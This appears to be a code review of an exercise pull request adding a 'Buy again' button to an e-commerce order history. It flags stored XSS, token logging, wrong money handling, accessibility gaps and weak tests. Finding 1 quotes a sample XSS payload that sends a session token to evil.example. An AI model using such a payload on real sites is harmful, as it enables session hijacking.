# Code review: pull request #16 "Buy again from the order history"

Reviewer: Ahmed (BrandStore front end) · Date: 2026-11-16 · Review on GitHub: https://github.com/pathlyworks/brandstore-ecommerce/pull/16#pullrequestreview-5925082187 (inline comments on each line
below) · Verdict: **changes requested** (the review is posted as comments, since GitHub does not let an account
request changes on its own pull request).

> Why this pull request: the brief's "supplied peer pull request" was not in the reference package, so a teammate's
> pull request was written for the exercise (branch `feature/buy-again`, not for merging) with issues of the kinds that
> reach real reviews. This file is the review a senior would leave on it.

## Summary for the author

Thanks for picking this up: "Buy again" is one of the most requested account features, and the shape is right (a
small component on each order row that reuses the cart reducer and the toast). Before it can merge, a few things
would hurt customers or the codebase: it can **run script from the API in the page**, it **logs the shopper's token**,
it **charges the wrong amounts** (prices read as cents, shown in dollars), it **bypasses the API client** (so it
breaks in every environment but a laptop), and the "button" **cannot be used with a keyboard**. None of these is hard
to fix; I suggest code for each below. The most important first.

## Findings

|   # | Severity              | Where                                                | Issue                                                                              |
| --: | :-------------------- | :--------------------------------------------------- | :--------------------------------------------------------------------------------- |
|   1 | Blocker (security)    | `BuyAgain.tsx:47`                                    | `dangerouslySetInnerHTML` with text from the API: stored XSS                       |
|   2 | Blocker (security)    | `BuyAgain.tsx:17-18, 22`                             | token read from the wrong store, written to the console, sent to a public endpoint |
|   3 | Blocker (correctness) | `BuyAgain.tsx:27-28, 49`                             | money as floating-point dollars: wrong unit, wrong currency, rounding              |
|   4 | Blocker (correctness) | `BuyAgain.tsx:21`                                    | hard-coded `http://localhost:4010`: bypasses the API client and `VITE_API_BASE`    |
|   5 | Major (correctness)   | `BuyAgain.tsx:12, 24, 47`                            | raw API JSON typed `any`: the reducer gets the wrong shape                         |
|   6 | Major (accessibility) | `BuyAgain.tsx:48-50`                                 | a clickable `<div>`: no keyboard, no role, an emoji for a name                     |
|   7 | Major (correctness)   | `BuyAgain.tsx:33-35`                                 | the toast says everything was added even when the cart refused some                |
|   8 | Major (reliability)   | `BuyAgain.tsx:15-31`                                 | effect without dependencies, cleanup or error handling                             |
|   9 | Major (performance)   | `OrdersRoute.tsx` (new column), `BuyAgain.tsx:20-25` | every row fetches every product, one after another, on page load                   |
|  10 | Minor                 | `BuyAgain.tsx:41-42`                                 | index as React key                                                                 |
|  11 | Major (tests)         | `BuyAgain.test.tsx`                                  | real network, snapshot only, nothing a user does is tested                         |

### 1. `dangerouslySetInnerHTML` with API text (line 47): blocker

**What:** the order note is inserted as HTML.
**Why it matters:** the note comes from the API, which stores what a shopper typed. A note like
`<img src=x onerror="fetch('https://evil.example/?t='+sessionStorage.getItem('brandstore:session'))">` would run in
the next person's browser who opens that order (an admin, in the admin view), with their session. Our rule
(`CLAUDE.md`, Task 4 security review) is that API and user text is always rendered as text.
**Suggestion:** render it as text; React escapes it:

```tsx
{
  order.note && <p className="text-text-muted">{order.note}</p>;
}
```

(and add `note` to the `Order` type through the mapper, instead of `(order as any).note`; see 5).

### 2. Token: wrong store, logged, sent where it is not needed (lines 17-18, 22): blocker

**What:** `localStorage.getItem('token')`, `console.log(..., token)`, and `Authorization: Bearer` on `GET /products/:id`.
**Why it matters:** the session lives in `sessionStorage` behind `AuthContext` (Task 4), so this reads `null` today;
if it ever found a token, it would print it to the console (copied into bug reports, visible to browser extensions)
and send it to an endpoint that is public and needs none.
**Suggestion:** product data is public: use `fetchProduct(id, signal)` from `api/endpoints`, which sends no token.
Remove the `console.log`. If a call ever needs auth, `request(..., { auth: true })` in the API client adds it.

### 3. Money as floating-point dollars (lines 27-28, 49): blocker

**What:** `p.price * p.quantity / 100`, `toFixed(2)`, and `$` in the label.
**Why it matters:** three bugs in one line. The API sends prices in pounds (`2499` for p-003, and the string `"EGP 33,999"` for
p-005), not cents, so the label shows 24.99 for a EGP 2,499 product and `NaN` for p-005; the store's currency is EGP, not dollars; and floating-point
sums drift (0.1 + 0.2). Shoppers would see a price 100× lower than what they pay.
**Suggestion:** build cart lines with the reducer and read the total from the selectors, which already work in integer
cents and format with `formatMoney`:

```tsx
const preview = cartReducer(EMPTY_CART, ...);         // or selectTotals of the lines you will add
<Button>Buy again, {formatMoney(totals.total, totals.currency)}</Button>
```

### 4. Hard-coded `http://localhost:4010` (line 21): blocker

**What:** the URL is written into the component.
**Why it matters:** in CI, in grading and in production the API is at `VITE_API_BASE`; this works on your laptop only.
It also skips everything the API client does: timeouts, the abort signal, `401` handling (session expiry), error
messages, and the response mappers.
**Suggestion:** `fetchProduct(line.productId, signal)` from `api/endpoints`.

### 5. Raw API JSON typed `any` (lines 12, 24, 47)

**What:** `useState<any[]>`, the JSON pushed as is, `(order as any).note`.
**Why it matters:** the reducer expects a `Product` (`price` in cents, `stock: { status, available }`). The raw JSON has
`price` as a string in some rows (p-005: `"EGP 33,999"`), `stock_status` instead of `stock` (and none at all for
p-007), so `add` silently does nothing for those
products, and TypeScript cannot warn because `any` turned it off. Our lint rules forbid `any` (CI will fail on it).
**Suggestion:** `useState<Product[]>`, values from `fetchProduct` (already mapped), and a `note?: string` on `Order`
set in `toOrder`.

### 6. A clickable `<div>` (lines 48-50)

**What:** `<div onClick>` with `🛒 $…` as its only content.
**Why it matters:** it cannot be reached with Tab or pressed with Enter/Space, screen readers do not announce it as a
button, and its name is "shopping cart emoji dollar 24.99". Keyboard and screen-reader shoppers cannot use the
feature (WCAG 2.1.1, 4.1.2).
**Suggestion:** our `Button`:

```tsx
<Button size="sm" variant="secondary" onClick={buyAgain} loading={loading}>
  Buy again <span className="sr-only">order {order.number}</span>
</Button>
```

### 7. The toast says everything was added (lines 33-35)

**What:** "Added N products to your cart" after dispatching, whatever the reducer did.
**Why it matters:** the reducer refuses out-of-stock products and caps quantities at the stock and at 10, so the
message can be false ("Added 3 products" when one was sold out). Shoppers then find a different cart at checkout.
**Suggestion:** compare the cart before and after (or apply the actions to the current state with `cartReducer` first)
and say what happened: "Added 2 of 3 products. Orbit Audio 3 is out of stock."

### 8. The effect (lines 15-31)

**What:** `useEffect(..., [])` that reads `order`, with no cleanup and no error handling (`res.ok` unchecked, `load()`
not awaited or caught).
**Why it matters:** if the row's order changes (paging the table reuses components) it keeps the old order's
products; if the shopper leaves the page it sets state after unmount; a 404 is pushed into the list as a "product";
a network error is an unhandled rejection. `react-hooks/exhaustive-deps` flags the missing dependency.
**Suggestion:** load on click instead (see 9), or use our `useApi` hook, which handles the abort signal, races and
errors: `useApi(\`buy-again:${order.id}\`, (signal) => Promise.all(order.lines.map((l) => fetchProduct(l.productId, signal))))`.

### 9. Fetching on page load, one after another (OrdersRoute column, lines 20-25)

**What:** every row mounts `BuyAgain`, which fetches each product of its order in sequence.
**Why it matters:** five orders of three lines is fifteen requests in a waterfall on every visit to the orders page,
for a button most visits never press. It slows the page and the API.
**Suggestion:** fetch when the button is pressed, in parallel (`Promise.all`), with the button in its loading state.

### 10. Index as key (lines 41-42)

`key={i}` mixes up rows when the list changes; use `key={p.id}`. Minor, and the list may go away with 9.

### 11. The test (`BuyAgain.test.tsx`)

**What:** it fetches `http://localhost:4010/account/orders` and compares a snapshot.
**Why it matters:** it needs a running API (it fails in CI), the request has no token (so it gets a 401 and the test
crashes on `items[0]`), and a snapshot would pass with any of the bugs above. Our tests use MSW and assert what the
user sees and does (`CONTRIBUTING.md`, Task 6).
**Suggestion:**

```tsx
it('adds the order’s in-stock products and says which one was sold out', async () => {
  signInForTest();
  renderApp('/account/orders');
  await user.click(await screen.findByRole('button', { name: /buy again.*TS-1001/i }));
  expect(await screen.findByText(/added 2 of 3 products/i)).toBeInTheDocument();
  expect(screen.getByRole('link', { name: 'Cart, 2 items' })).toBeInTheDocument();
});
```

plus one for an API error (MSW returns 500 → an error message, nothing added).

## What is good

- Reusing `useCart().dispatch` and the toast instead of new state: the right instinct.
- The feature is small and on one screen; easy to review and to test.
- The doc comment at the top says what the component does.

## Next steps

1, 2, 3 and 4 before merging; 5 to 9 in this pull request too if possible (they are small once 4 is done); 10 and 11
with the tests. Happy to pair on the `useApi` version or the test if useful. I will re-review as soon as you push.
